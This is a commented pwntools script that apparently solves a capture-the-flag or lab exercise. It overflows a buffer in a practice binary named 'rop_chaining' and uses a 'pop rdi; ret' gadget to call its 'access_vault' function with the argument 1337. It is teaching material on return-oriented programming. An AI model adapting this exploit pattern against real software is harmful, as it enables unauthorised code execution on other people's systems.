#!/usr/bin/env python3

from pwn import *

import argparse


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--debug', action='store_true')

    args = parser.parse_args()

    elf = context.binary = ELF('rop_chaining')

    rop = ROP(elf)

    # Address can also be found by running 'ropper --file rop_chaining --search "pop rdi; ret"'
    pop_rdi_gadget_addr = rop.find_gadget(['pop rdi', 'ret'])[0]
    access_vault_function_addr = elf.symbols['access_vault']

    if args.debug:
        io = gdb.debug(context.binary.path, '''
        set follow-fork-mode child
        break main
        continue
        ''')
    else:
        io = process()  # Actually start running the process

    io.recvuntil(b"Enter the password to access Santa Ono's secret vault:")

    # Padding to get to return address
    padding = b'A' * 0x10 + b'B' * 0x8
    # Pop 1337 into rdi register
    pop_1337_payload = p64(pop_rdi_gadget_addr) + p64(1337)
    # Notice last chain is calling the target access_vault function
    # Most 64-bit calling conventions place the first argument in rdi
    payload = padding + pop_1337_payload + p64(access_vault_function_addr)

    io.send(payload)

    io.interactive()
